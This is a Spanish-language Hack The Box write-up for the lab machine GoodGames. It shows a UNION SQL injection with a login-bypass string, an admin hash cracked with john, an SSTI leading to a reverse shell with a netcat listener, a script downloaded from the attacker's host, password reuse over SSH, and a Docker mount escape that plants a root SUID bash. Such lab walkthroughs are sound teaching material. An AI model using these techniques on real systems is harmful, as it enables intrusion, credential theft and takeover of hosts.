---
layout: single
title: GoodGames - Hack The Box
excerpt: "En este post vamos a estar resolviendo la maquina GoodGames de la plataforma de Hackthebox donde vamos a estar explotando una SQL Injection de tipo Union en el campo donde se ingresa el correo gracias a eso obtendremos un hash del usuario admin que crackearemos fácilmente para conectarnos a otro panel de login donde explotaremos un SSTI para obtener una reverse shell y obtener una shell como root para la escalada de privilegios nos conectaremos como otro usuario por SSH y nos daremos cuenta que hay una montura que todo lo que hagamos en un directorio en la maquina real lo veremos reflejado en el docker nos aprovecharemos de eso para poner la bash SUID"
date: 2023-07-06
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-goodgames/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
tags:  
  - SQL Injection
  - Hash Cracking
  - Docker Breakout
  - Server Side Template Injection (SSTI)
---

<p align="center">
<img src="/assets/images/htb-writeup-goodgames/banner.png">
</p>

```python
❯ ping -c 1 10.10.11.130
PING 10.10.11.130 (10.10.11.130) 56(84) bytes of data.
64 bytes from 10.10.11.130: icmp_seq=1 ttl=63 time=98.0 ms

--- 10.10.11.130 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 98.041/98.041/98.041/0.000 ms
❯ whichSystem.py 10.10.11.130

10.10.11.130 (ttl -> 63): Linux
```

## PortScan

```bash
❯ nmap -sCV -p80 10.10.11.130 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-05 16:24 CST
Nmap scan report for 10.10.11.130
Host is up (0.095s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.51
|_http-title: GoodGames | Community and Store
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.54 seconds
```

## Enumeracion

Pues bueno en este caso solo tenemos el puerto **80** abierto es curioso pero bueno vemos que se esta usando **Python** por detrás lo mas probable es que vallamos a explotar lo mas probable es que haya algún **SSTI** o alguna otra cosa pero bueno también vemos un **subdominio** así que vamos a agregarlo al **/etc/hosts**

```bash
❯ echo "10.10.11.130 goodgames.htb" | sudo tee -a /etc/hosts
10.10.11.130 goodgames.htb
❯ ping -c 1 goodgames.htb
PING goodgames.htb (10.10.11.130) 56(84) bytes of data.
64 bytes from goodgames.htb (10.10.11.130): icmp_seq=1 ttl=63 time=102 ms

--- goodgames.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 101.702/101.702/101.702/0.000 ms
```

Con la herramienta `whatweb` vamos a ver las tecnologías que corre el servicio web 

```ruby
❯ whatweb http://goodgames.htb
http://goodgames.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.9.2], IP[10.10.11.130], JQuery, Meta-Author[_nK], PasswordField[password], Python[3.9.2], Script, Title[GoodGames | Community and Store], Werkzeug[2.0.2], X-UA-Compatible[IE=edge]
```

Bueno si vemos desde el navegador la pagina la verdad es que es lo mismo no cambia nada como tal 

Esta es cuando ponemos la **IP**

![](/assets/images/htb-writeup-goodgames/web1.png)

Y esta es cuando no podemos el **subdominio** en si no cambia nada vemos lo mismo

![](/assets/images/htb-writeup-goodgames/web2.png)

Bueno nos vamos a quedar con la que sea igual es lo mismo si analizamos la web vemos que básicamente se trata de una tienda de videojuegos y **post** de los mismos

![](/assets/images/htb-writeup-goodgames/web3.png)

Si nos vamos ala ruta `/store` vemos que nos dicen **coming soon**

![](/assets/images/htb-writeup-goodgames/web4.png)

Si nos vamos al icono de ese nos sale esta ventana emergente para poder **logearnos**

![](/assets/images/htb-writeup-goodgames/web5.png)

Si le damos en que no tenemos una cuenta nos lleva a este apartado vamos a registrarnos para ver si nos deja

![](/assets/images/htb-writeup-goodgames/web6.png)

Si le damos el **SIGN UP** vemos que como tal nos crea la cuenta vamos a conectarnos para ver si es cierto

![](/assets/images/htb-writeup-goodgames/web7.png)

![](/assets/images/htb-writeup-goodgames/web8.png)

Si le damos al boton de **LOGIN** vemos que nos redirige aquí `/profile`

![](/assets/images/htb-writeup-goodgames/web9.png)

Bueno vemos que nos dicen que podemos cambiar nuestra foto de perfil y correo electrónico

## SQL Injection

Bueno algo que podemos hacer es conectarnos de nuevo e interceptar la petición con **Burpsuite** para ver como viaja la petición

```bash
❯ burpsuite &>/dev/null & disown
[1] 45167
```

![](/assets/images/htb-writeup-goodgames/web10.png)

Vamos a enviar la petición al **Repeater** con `ctrl+r` si enviamos le petición como tal nos dice que **Login Sucess** 

![](/assets/images/htb-writeup-goodgames/web11.png)

Bueno si recordamos nos decían que podíamos cambiar nuestro correo y hacer cambios y como de momento tenemos el control de los parámetros podemos hacer algunas pruebas ya que si nos conecta y nos da una **cookie** vemos la respuesta con esto también

![](/assets/images/htb-writeup-goodgames/web12.png)

Bueno como tal podemos probar una **SQL Injection** ya que como podemos cambiar el correo podemos ver si algún campo es vulnerable y no esta bien satinizado por detrás 

Si probamos con una inyección básica para burlar el panel de login `' or 1=1-- -` vemos que funciona y nos dice que como tal **Login Sucess**

![](/assets/images/htb-writeup-goodgames/web13.png)

Para verlo reflejado en la web debemos hacerlo desde la parte del **Intercept** para estar conectados como el usuario `administrador` lo mas probable

![](/assets/images/htb-writeup-goodgames/web14.png)

Bueno al darle a **Forward** vemos que si estamos conectados

![](/assets/images/htb-writeup-goodgames/web15.png)

Pero bueno como es una inyección de tipo **Union** podemos seguir enumerando a través de la inyección para dumpear usuarios y contraseñas que estén hay 

# SQL Injection dumpeando datos

Si vemos el numero de columnas y probamos con 5 nos sale esto 

![](/assets/images/htb-writeup-goodgames/web16.png)

Pero si podemos 4 vemos la respuesta cambia así que con esto sabemos que hay 4 

![](/assets/images/htb-writeup-goodgames/web17.png)

Bueno ahora vamos a ver la base de datos actualmente en uso pero para eso primero debemos de ver si vemos algún campo reflejado en la respuesta para inyectar hay directamente o ir de 1 en 1 para ver cual funciona en caso de verlo

![](/assets/images/htb-writeup-goodgames/web18.png)

Bueno ahora vemos la base de datos actualmente en uso 

![](/assets/images/htb-writeup-goodgames/web19.png)

Si verificamos las bases de datos solo vemos estas 2 

![](/assets/images/htb-writeup-goodgames/web20.png)

Vamos a ver las tablas de la base de datos `main`

Vemos que tiene 3 tablas

![](/assets/images/htb-writeup-goodgames/web21.png)

Y bueno ahora vamos a enumerar las columnas de la tabla **User**

![](/assets/images/htb-writeup-goodgames/web22.png)

Vamos a mostrar todos los campos separados por `:`

Vemos el **hash** de **admin** y del usuario que registramos

![](/assets/images/htb-writeup-goodgames/web23.png)

```bash
❯ catn hash.txt
admin@goodgames.htb:2b22337f218b2d82dfc3b6f77e7cb8ec
```

Bueno vemos que el **hash** es de tipo **MD5**

```bash
❯ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 2b22337f218b2d82dfc3b6f77e7cb8ec

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

Least Possible Hashs:
[+] RAdmin v2.x
[+] NTLM
[+] MD4
[+] MD2
[+] MD5(HMAC)
[+] MD4(HMAC)
[+] MD2(HMAC)
[+] MD5(HMAC(Wordpress))
[+] Haval-128
[+] Haval-128(HMAC)
[+] RipeMD-128
[+] RipeMD-128(HMAC)
[+] SNEFRU-128
[+] SNEFRU-128(HMAC)
[+] Tiger-128
[+] Tiger-128(HMAC)
[+] md5($pass.$salt)
[+] md5($salt.$pass)
[+] md5($salt.$pass.$salt)
[+] md5($salt.$pass.$username)
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($pass.$salt))
[+] md5($salt.md5($salt.$pass))
[+] md5($salt.md5(md5($pass).$salt))
[+] md5($username.0.$pass)
[+] md5($username.LF.$pass)
[+] md5($username.md5($pass).$salt)
[+] md5(md5($pass))
[+] md5(md5($pass).$salt)
[+] md5(md5($pass).md5($salt))
[+] md5(md5($salt).$pass)
[+] md5(md5($salt).md5($pass))
[+] md5(md5($username.$pass).$salt)
[+] md5(md5(md5($pass)))
[+] md5(md5(md5(md5($pass))))
[+] md5(md5(md5(md5(md5($pass)))))
[+] md5(sha1($pass))
[+] md5(sha1(md5($pass)))
[+] md5(sha1(md5(sha1($pass))))
[+] md5(strtoupper(md5($pass)))
--------------------------------------------------
 HASH: 
```

Vamos a crackearlo

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=2
Press 'q' or Ctrl-C to abort, almost any other key for status
superadministrator (admin@goodgames.htb)
1g 0:00:00:00 DONE (2023-07-05 17:44) 1.923g/s 6686Kp/s 6686Kc/s 6686KC/s superarely1993..super'star007
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed
```

Bueno tenemos credenciales pero como tal ya estamos conectados como el admin así que tenemos que buscar otra forma de usarlas no había mas puertos abiertos 

Si vamos al panel donde ya estamos como el **admin** si queremos dar click aquí nos redirige a este subdominio

![](/assets/images/htb-writeup-goodgames/web24.png)

Vamos agregarlo al **/etc/hosts**

```bash
❯ cat /etc/hosts | tail -n 1
10.10.11.130 goodgames.htb internal-administration.goodgames.htb
```

## Server Side Template Injection (SSTI)

Bueno encontramos este panel de **login** vemos que usa **flask** a si que ya sabemos que tendremos que explotar una vulnerabilidad **web**

![](/assets/images/htb-writeup-goodgames/web25.png)

```ruby
❯ whatweb http://internal-administration.goodgames.htb/login
http://internal-administration.goodgames.htb/login [200 OK] Bootstrap, Cookies[session], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.0.2 Python/3.6.7], HttpOnly[session], IP[10.10.11.130], Meta-Author[Themesberg], Open-Graph-Protocol[website], PasswordField[password], Python[3.6.7], Script, Title[Flask Volt Dashboard -  Sign IN  | AppSeed][Title element contains newline(s)!], Werkzeug[2.0.2]
```

Si probamos las credenciales que tenemos vemos que funcionan `admin:superadministrator`

![](/assets/images/htb-writeup-goodgames/web26.png)

Si examinamos y seleccionamos el **Current User:admin** y vemos a **profile** podemos introducir nosotros los campos que nos dejan y vemos el **output** reflejado

![](/assets/images/htb-writeup-goodgames/web27.png)

Bueno como tenemos el control del campo **full name** podemos aplicar un **SSTI**

<https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection>

Si aplicamos una inyección básica vemos que funciona ![](/assets/images/htb-writeup-goodgames/1.png)

![](/assets/images/htb-writeup-goodgames/web28.png)

Podemos ver si podemos como tal ejecutar código y si ![](/assets/images/htb-writeup-goodgames/2.png)

Vemos que estamos como el usuario **root** lo cual es raro ya que no siempre suele pasar esto pero bueno lo mas probable es que ganemos acceso a un **contenedor** 

![](/assets/images/htb-writeup-goodgames/web29.png)

## Shell as root in a container

Como podemos ejecutar comandos vamos a enviarnos una reverse shell ![](/assets/images/htb-writeup-goodgames/3.png)

Nos ponemos en escucha

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
```

Y bueno una vez podemos todo ese **payload** en el campo **Full Name** y le damos en **Save all** tenemos la **shell**

```bash
❯ nc -nlvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.130 60676
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@3a453ab39d3d:/backend# whoami
whoami
root
root@3a453ab39d3d:/backend# 
```

Vamos a hacer un tratamiento de la **tty** 

```bash
root@3a453ab39d3d:/backend# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@3a453ab39d3d:/backend# ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
ENTER
root@3a453ab39d3d:/backend# export TERM=xterm
```

Y bueno estamos en un contenedor

```bash
root@3a453ab39d3d:/backend# hostname -I
172.19.0.2 
root@3a453ab39d3d:/backend# 
```

## User flag

Aquí esta la flag

```bash
root@3a453ab39d3d:/home/augustus# cat user.txt 
46f7ebd0f7b62991cb78d5f1a0792453
root@3a453ab39d3d:/home/augustus# 
```

Bueno el usuario **augustus** existe así que de alguna forma tenemos que tratar de conectarnos como ese usuario 

# Enumeration container

Pero el usuario no existe en nuestro en `/etc/passwd`

```python
root@3a453ab39d3d:/home/augustus# cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
root@3a453ab39d3d:/home/augustus# cat /etc/passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
root@3a453ab39d3d:/home/augustus# cat /etc/passwd | grep augustus
root@3a453ab39d3d:/home/augustus# 
```

También vemos que el identificador es `1000` pero no existe nadie con ese 

```bash
root@3a453ab39d3d:/home/augustus# ls -la
total 24
drwxr-xr-x 2 1000 1000 4096 Dec  2  2021 .
drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root    9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000 3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000  807 Oct 19  2021 .profile
-rw-r----- 1 root 1000   33 Jul  5 22:15 user.txt
root@3a453ab39d3d:/home/augustus#
root@3a453ab39d3d:/home/augustus# cat /etc/passwd | grep 1000
```

Bueno algo que podemos hacer es ver en donde esta montando **/home/augustus** ya que como tal podemos verlo en el contenedor pero como el usuario existe lo mas probable es que en la maquina real pues este también 

Si vemos las monturas vemos que el usuario `augustus` como tal si existe y vemos que esta montada su ruta en nuestro contenedor

```bash
root@3a453ab39d3d:/home/augustus# mount | grep -vE "tmpfs|shm|proc|cgroup|overlay|mqueue|devpts|sysfs" | head -n 1
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
root@3a453ab39d3d:/home/augustus# mount | grep augustus
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
root@3a453ab39d3d:/home/augustus# 
```

Bueno vamos a ver los puertos abiertos que tiene este contenedor pero podemos saber que la ip es esta `172.19.0.1` mediante un bucle **for** en este caso no es necesario enviar una cadena vacía ya que tenemos **ping** y podemos enumerar gracias a eso 

```bash
root@3a453ab39d3d:/home/augustus# for i in {1..254}; do (ping -c 1 172.19.0.${i} | grep "bytes from" | grep -v "Unreachable" &);done;
64 bytes from 172.19.0.1: icmp_seq=1 ttl=64 time=0.086 ms
64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.025 ms
root@3a453ab39d3d:/home/augustus# 
```

Ahora vamos a hacer un script en **bash** para ver los puertos abiertos de la maquina pero `nano` no funciona así que lo que haremos es básicamente crear el script desde nuestra maquina de atacante para transferirlo ala maquina victima

```bash
root@3a453ab39d3d:/opt# nano
```

También podemos ejecutar un **oneliner** para descubrir los `puertos`

```bash
root@3a453ab39d3d:/opt# for port in {1..65535}; do echo > /dev/tcp/172.19.0.1/$port && echo "$port -> open"; done 2>/dev/null
22 -> open
80 -> open
root@3a453ab39d3d:/opt# 
```

Pero bueno de esta forma podemos hacer el **script** en **bash**

```bash
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.10.11.130 - - [05/Jul/2023 18:46:06] "GET /portDiscovery.sh HTTP/1.1" 200 -
```

Ahora lo transferimos ala maquina victima

```bash
root@3a453ab39d3d:/opt# wget http://10.10.14.12:8080/portDiscovery.sh
--2023-07-06 00:46:04--  http://10.10.14.12:8080/portDiscovery.sh
Connecting to 10.10.14.12:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 158 [text/x-sh]
Saving to: ‘portDiscovery.sh’

portDiscovery.sh                 100%[=======================================================>]     158  --.-KB/s    in 0s      

2023-07-06 00:46:04 (11.1 MB/s) - ‘portDiscovery.sh’ saved [158/158]

root@3a453ab39d3d:/opt# 
```

Este es el script 

```bash
root@3a453ab39d3d:/opt# cat portDiscovery.sh 
#!/bin/bash

for port in $(seq 1 65535); do
	timeout 1 bash -c "echo '' > /dev/tcp/172.19.0.1/$port" 2>/dev/null && echo "[+] Port $port - OPEN" &
done; wait
root@3a453ab39d3d:/opt# 
```

Si lo ejecutamos vemos los mismos puertos

```bash
root@3a453ab39d3d:/opt# chmod +x portDiscovery.sh 
root@3a453ab39d3d:/opt# ./portDiscovery.sh 
[+] Port 22 - OPEN
[+] Port 80 - OPEN
^C
root@3a453ab39d3d:/opt# 
```

Como tenemos una contraseña lo que podemos hacer es reutilizarla `superadministrator` para poder conectarnos con el usuario **augustus** por **SSH** a esa **IP**

## Shell as augustus 

```bash
root@3a453ab39d3d:/opt# ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ export TERM=xterm
augustus@GoodGames:~$ whoami
augustus
augustus@GoodGames:~$ 
```

Vemos que ahora estamos en la maquina victima 

```bash
augustus@GoodGames:~$ hostname -I
10.10.11.130 172.19.0.1 172.17.0.1 dead:beef::250:56ff:feb9:cd79 
augustus@GoodGames:~$ 
```

## Escalada de privilegios

Y bueno si observamos son los mismos archivos que vimos en el contenedor 

```bash
augustus@GoodGames:~$ ls -la
total 24
drwxr-xr-x 2 augustus augustus 4096 Dec  2  2021 .
drwxr-xr-x 3 root     root     4096 Oct 19  2021 ..
lrwxrwxrwx 1 root     root        9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus  220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus 3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus  807 Oct 19  2021 .profile
-rw-r----- 1 root     augustus   33 Jul  5 23:15 user.txt
augustus@GoodGames:~$ 
```

Como todo el directorio esta montando en el contenedor si creamos un archivo lo vamos a ver reflejado en el contenedor donde estamos como `root`

```bash
augustus@GoodGames:~$ ls -la
total 24
drwxr-xr-x 2 augustus augustus 4096 Dec  2  2021 .
drwxr-xr-x 3 root     root     4096 Oct 19  2021 ..
lrwxrwxrwx 1 root     root        9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus  220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus 3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus  807 Oct 19  2021 .profile
-rw-r----- 1 root     augustus   33 Jul  5 23:15 user.txt
augustus@GoodGames:~$ touch xd.txt
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.
root@3a453ab39d3d:/opt# cd /home/augustus/
root@3a453ab39d3d:/home/augustus# ls -la
total 24
drwxr-xr-x 2 1000 1000 4096 Jul  6 01:05 .
drwxr-xr-x 1 root root 4096 Nov  5  2021 ..
lrwxrwxrwx 1 root root    9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 1000 1000  220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 1000 1000 3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 1000 1000  807 Oct 19  2021 .profile
-rw-r----- 1 root 1000   33 Jul  5 22:15 user.txt
-rw-r--r-- 1 1000 1000    0 Jul  6 01:05 xd.txt
root@3a453ab39d3d:/home/augustus# 
```

Todo lo que creamos en la maquina real como **augustus** se ve reflejado en el contenedor lo que podemos hacer es copear la `Bash` a nuestro directorio y desde el contenedor como estamos como **root** asignarle privilegios **SUID** y hacer propietario a **root** ala **bash** para desde la shell con **SSH** como **augustus** hacer un **./bash -p** por que podemos ver reflejado lo que hagamos en la maquina real y en el contenedor en ese directorio

```bash
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ ls -la
total 1232
drwxr-xr-x 2 augustus augustus    4096 Jul  6 02:10 .
drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..
-rwxr-xr-x 1 augustus augustus 1234376 Jul  6 02:10 bash
lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
-rw-r----- 1 root     augustus      33 Jul  5 23:15 user.txt
augustus@GoodGames:~$ 
```

Ahora vamos al contenedor otra vez para asignarle el usuario y grupo **root:root** ala **bash** y privilegios **SUID** 

```bash
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.
root@3a453ab39d3d:/home/augustus# ls -l 
total 1212
-rwxr-xr-x 1 1000 1000 1234376 Jul  6 01:10 bash
-rw-r----- 1 root 1000      33 Jul  5 22:15 user.txt
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# ls -l
total 1212
-rwxr-xr-x 1 root root 1234376 Jul  6 01:10 bash
-rw-r----- 1 root 1000      33 Jul  5 22:15 user.txt
root@3a453ab39d3d:/home/augustus# chmod 4755 bash
root@3a453ab39d3d:/home/augustus# ls -l
total 1212
-rwsr-xr-x 1 root root 1234376 Jul  6 01:10 bash
-rw-r----- 1 root 1000      33 Jul  5 22:15 user.txt
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Jul  6 02:06:32 2023 from 172.19.0.2
augustus@GoodGames:~$ 
```

## Shell as root && root flag

Ahora la **bash** es **SUID**

```bash
augustus@GoodGames:~$ ls -l
total 1212
-rwsr-xr-x 1 root root     1234376 Jul  6 02:10 bash
-rw-r----- 1 root augustus      33 Jul  5 23:15 user.txt
augustus@GoodGames:~$ 
```

Y nos conectamos 

```bash
augustus@GoodGames:~$ ./bash -p
bash-5.1# whoami
root
bash-5.1#
bash-5.1# cd /root
bash-5.1# cat root.txt 
58456af89668c685b38294159a8016af
bash-5.1# 
```
